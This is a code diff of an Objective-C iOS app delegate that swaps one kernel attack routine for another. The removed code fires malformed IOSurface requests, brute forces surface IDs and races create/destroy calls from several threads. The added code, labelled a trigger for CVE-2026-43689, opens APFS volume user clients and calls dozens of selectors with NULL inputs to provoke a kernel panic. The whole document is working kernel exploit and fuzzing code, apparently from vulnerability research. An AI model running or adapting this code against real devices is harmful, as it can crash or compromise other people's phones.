@@ -1,11 +1,8 @@
 #import <Foundation/Foundation.h>
-#import <Metal/Metal.h>
 #import <UIKit/UIKit.h>
 #import <IOKit/IOKitLib.h>
 #import <mach/mach.h>
-#import <dlfcn.h>
 #import <sys/utsname.h>
-#import <pthread.h>
 
 @interface AppDelegate : UIResponder <UIApplicationDelegate>
 @property (strong, nonatomic) UIWindow *window;
@@ -40,196 +37,107 @@
     self.window.rootViewController = vc;
     [self.window makeKeyAndVisible];
     
-    [self log:@"=== IOSurface Kernel Trigger MAX ==="];
+    [self log:@"=== CVE-2026-43689 Trigger ==="];
+    [self log:@"Target: AppleAPFSVolumeBSDClient"];
+    [self log:@"Bug: Missing NULL pointer check"];
     
     struct utsname uts;
     uname(&uts);
     [self log:[NSString stringWithFormat:@"Device: %s | iOS: %@", uts.machine, [[UIDevice currentDevice] systemVersion]]];
     
-    // Launch attack from multiple threads
-    for (int i = 0; i < 3; i++) {
-        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
-            [self attackIOSurface:i];
-        });
-    }
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
+        [self triggerCVE202643689];
+    });
     
     return YES;
 }
 
-- (void)attackIOSurface:(int)threadID {
-    [self log:[NSString stringWithFormat:@"[T%d] Starting IOSurface attack...", threadID]];
+- (void)triggerCVE202643689 {
+    [self log:@"\n[1] Searching for APFS volume services..."];
     
-    // Step 1: Open IOSurfaceRoot
-    io_service_t root = IOServiceGetMatchingService(0, IOServiceMatching("IOSurfaceRoot"));
-    if (!root) {
-        [self log:[NSString stringWithFormat:@"[T%d] FAIL: IOSurfaceRoot not found", threadID]];
-        return;
-    }
-    
-    io_connect_t conn = 0;
-    kern_return_t kr = IOServiceOpen(root, mach_task_self(), 0, &conn);
-    IOObjectRelease(root);
+    // Find APFS-related services
+    io_iterator_t iterator;
+    kern_return_t kr = IOServiceGetMatchingServices(0, IOServiceMatching("AppleAPFSVolume"), &iterator);
     if (kr != KERN_SUCCESS) {
-        [self log:[NSString stringWithFormat:@"[T%d] FAIL: IOServiceOpen: 0x%x", threadID, kr]];
+        [self log:@"FAIL: No AppleAPFSVolume services found"];
         return;
     }
-    [self log:[NSString stringWithFormat:@"[T%d] PASS: IOSurfaceRoot opened", threadID]];
     
-    // Step 2: MASSIVE surface creation attempts
-    [self log:[NSString stringWithFormat:@"[T%d] Firing 50 surface variations...", threadID]];
-    
-    for (int i = 0; i < 50; i++) {
-        uint32_t sid = 0;
-        kern_return_t result;
+    io_service_t service;
+    int count = 0;
+    while ((service = IOIteratorNext(iterator)) != 0) {
+        count++;
+        [self log:[NSString stringWithFormat:@"[2] Found APFS service #%d: 0x%x", count, service]];
         
-        switch (i % 10) {
-            case 0: { // Null address
-                NSDictionary *p = @{
-                    @"IOSurfaceIsGlobal": @YES,
-                    @"IOSurfaceWidth": @256,
-                    @"IOSurfaceHeight": @256,
-                    @"IOSurfaceAllocSize": @65536,
-                    @"IOSurfaceAddress": @0,
-                };
-                result = IOConnectCallMethod(conn, 0, NULL, 0,
-                    (__bridge CFDictionaryRef)p, sizeof(p),
-                    NULL, NULL, &sid, NULL);
-                break;
-            }
-            case 1: { // Zero dimensions
-                NSDictionary *p = @{
-                    @"IOSurfaceWidth": @0,
-                    @"IOSurfaceHeight": @0,
-                    @"IOSurfaceAllocSize": @0,
-                };
-                result = IOConnectCallMethod(conn, 0, NULL, 0,
-                    (__bridge CFDictionaryRef)p, sizeof(p),
-                    NULL, NULL, &sid, NULL);
-                break;
-            }
-            case 2: { // Huge dimensions
-                NSDictionary *p = @{
-                    @"IOSurfaceWidth": @0x10000,
-                    @"IOSurfaceHeight": @0x10000,
-                    @"IOSurfaceAllocSize": @0x10000000,
-                };
-                result = IOConnectCallMethod(conn, 0, NULL, 0,
-                    (__bridge CFDictionaryRef)p, sizeof(p),
-                    NULL, NULL, &sid, NULL);
-                break;
-            }
-            case 3: { // Negative values
-                NSDictionary *p = @{
-                    @"IOSurfaceWidth": @-1,
-                    @"IOSurfaceHeight": @-1,
-                    @"IOSurfaceAllocSize": @-1,
-                };
-                result = IOConnectCallMethod(conn, 0, NULL, 0,
-                    (__bridge CFDictionaryRef)p, sizeof(p),
-                    NULL, NULL, &sid, NULL);
-                break;
-            }
-            case 4: { // Max uint32
-                NSDictionary *p = @{
-                    @"IOSurfaceWidth": @0xFFFFFFFF,
-                    @"IOSurfaceHeight": @0xFFFFFFFF,
-                    @"IOSurfaceAllocSize": @0xFFFFFFFF,
-                };
-                result = IOConnectCallMethod(conn, 0, NULL, 0,
-                    (__bridge CFDictionaryRef)p, sizeof(p),
-                    NULL, NULL, &sid, NULL);
-                break;
-            }
-            case 5: { // Surface ID 0
-                uint64_t input[1] = {0};
-                result = IOConnectCallMethod(conn, 1, input, 1, NULL, 0, NULL, NULL, NULL, NULL);
-                break;
-            }
-            case 6: { // Get base of ID 0
-                uint64_t input[1] = {0};
-                result = IOConnectCallMethod(conn, 2, input, 1, NULL, 0, NULL, NULL, NULL, NULL);
-                break;
-            }
-            case 7: { // Rapid create/destroy
-                NSDictionary *p = @{
-                    @"IOSurfaceWidth": @64,
-                    @"IOSurfaceHeight": @64,
-                    @"IOSurfaceAllocSize": @4096,
-                };
-                result = IOConnectCallMethod(conn, 0, NULL, 0,
-                    (__bridge CFDictionaryRef)p, sizeof(p),
-                    NULL, NULL, &sid, NULL);
-                if (result == KERN_SUCCESS) {
-                    uint64_t input[1] = {sid};
-                    IOConnectCallMethod(conn, 1, input, 1, NULL, 0, NULL, NULL, NULL, NULL);
+        // Try to open user client
+        io_connect_t conn = 0;
+        kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
+        if (kr == KERN_SUCCESS) {
+            [self log:[NSString stringWithFormat:@"[3] Opened connection: 0x%x", conn]];
+            
+            // Try various selectors that might trigger the vulnerable path
+            for (int selector = 0; selector < 20; selector++) {
+                uint64_t input[10] = {0};
+                uint64_t output[10] = {0};
+                uint32_t outputCnt = 10;
+                
+                // Fill input with potentially problematic values
+                for (int i = 0; i < 10; i++) {
+                    input[i] = 0;  // NULL values to trigger missing check
                 }
-                break;
+                
+                kr = IOConnectCallMethod(conn, selector, input, 10, NULL, 0, output, &outputCnt, NULL, NULL);
+                
+                if (kr != KERN_SUCCESS && kr != 0xe00002c2) {
+                    [self log:[NSString stringWithFormat:@"[4] Selector %d: 0x%x (interesting!)", selector, kr]];
+                }
             }
-            case 8: { // Pixel format fuzz
-                NSDictionary *p = @{
-                    @"IOSurfaceWidth": @256,
-                    @"IOSurfaceHeight": @256,
-                    @"IOSurfaceAllocSize": @65536,
-                    @"IOSurfacePixelFormat": @(0x41414141 + i),
-                };
-                result = IOConnectCallMethod(conn, 0, NULL, 0,
-                    (__bridge CFDictionaryRef)p, sizeof(p),
-                    NULL, NULL, &sid, NULL);
-                break;
-            }
-            case 9: { // BytesPerRow mismatch
-                NSDictionary *p = @{
-                    @"IOSurfaceWidth": @256,
-                    @"IOSurfaceHeight": @256,
-                    @"IOSurfaceAllocSize": @65536,
-                    @"IOSurfaceBytesPerRow": @1,
-                };
-                result = IOConnectCallMethod(conn, 0, NULL, 0,
-                    (__bridge CFDictionaryRef)p, sizeof(p),
-                    NULL, NULL, &sid, NULL);
-                break;
-            }
+            
+            IOServiceClose(conn);
+        } else {
+            [self log:[NSString stringWithFormat:@"[3] Failed to open: 0x%x", kr]];
         }
         
-        if (i % 10 == 0) {
-            [self log:[NSString stringWithFormat:@"[T%d] Variation %d: 0x%x (SID: %u)", 
-                      threadID, i, result, sid]];
-        }
+        IOObjectRelease(service);
+        
+        if (count >= 5) break;  // Limit to 5 services
     }
     
-    // Step 3: Surface ID 0 brute force
-    [self log:[NSString stringWithFormat:@"[T%d] Brute forcing surface ID 0...", threadID]];
-    for (int selector = 0; selector < 20; selector++) {
-        uint64_t input[1] = {0};
-        kern_return_t result = IOConnectCallMethod(conn, selector, input, 1, 
-                                                   NULL, 0, NULL, NULL, NULL, NULL);
-        if (result != KERN_SUCCESS && result != 0xe00002c2) {
-            [self log:[NSString stringWithFormat:@"[T%d] Selector %d on ID 0: 0x%x", 
-                      threadID, selector, result]];
+    IOObjectRelease(iterator);
+    
+    // Also try AppleAPFSVolumeBSDClient directly
+    [self log:@"\n[5] Trying AppleAPFSVolumeBSDClient..."];
+    io_service_t bsdClient = IOServiceGetMatchingService(0, IOServiceMatching("AppleAPFSVolumeBSDClient"));
+    if (bsdClient) {
+        [self log:[NSString stringWithFormat:@"Found BSD client: 0x%x", bsdClient]];
+        
+        io_connect_t conn = 0;
+        kr = IOServiceOpen(bsdClient, mach_task_self(), 0, &conn);
+        if (kr == KERN_SUCCESS) {
+            [self log:[NSString stringWithFormat:@"Opened BSD client: 0x%x", conn]];
+            
+            // Trigger vulnerable method with NULL parameters
+            for (int selector = 0; selector < 30; selector++) {
+                uint64_t input[10] = {0};
+                uint64_t output[10] = {0};
+                uint32_t outputCnt = 10;
+                
+                kr = IOConnectCallMethod(conn, selector, input, 10, NULL, 0, output, &outputCnt, NULL, NULL);
+                
+                if (kr != KERN_SUCCESS && kr != 0xe00002c2) {
+                    [self log:[NSString stringWithFormat:@"BSD Selector %d: 0x%x", selector, kr]];
+                }
+            }
+            
+            IOServiceClose(conn);
         }
+        IOObjectRelease(bsdClient);
+    } else {
+        [self log:@"AppleAPFSVolumeBSDClient not found"];
     }
     
-    // Step 4: Rapid fire race
-    [self log:[NSString stringWithFormat:@"[T%d] Race condition test...", threadID]];
-    for (int i = 0; i < 20; i++) {
-        uint32_t sid = 0;
-        NSDictionary *p = @{
-            @"IOSurfaceWidth": @64,
-            @"IOSurfaceHeight": @64,
-            @"IOSurfaceAllocSize": @4096,
-        };
-        kern_return_t result = IOConnectCallMethod(conn, 0, NULL, 0,
-            (__bridge CFDictionaryRef)p, sizeof(p),
-            NULL, NULL, &sid, NULL);
-        if (result == KERN_SUCCESS) {
-            uint64_t input[1] = {sid};
-            IOConnectCallMethod(conn, 1, input, 1, NULL, 0, NULL, NULL, NULL, NULL);
-            IOConnectCallMethod(conn, 2, input, 1, NULL, 0, NULL, NULL, NULL, NULL);
-        }
-    }
-    
-    IOServiceClose(conn);
-    [self log:[NSString stringWithFormat:@"[T%d] === Attack Complete ===", threadID]];
+    [self log:@"\n=== Trigger Complete ==="];
+    [self log:@"Check for kernel panic or unexpected behavior"];
 }
 
 @end
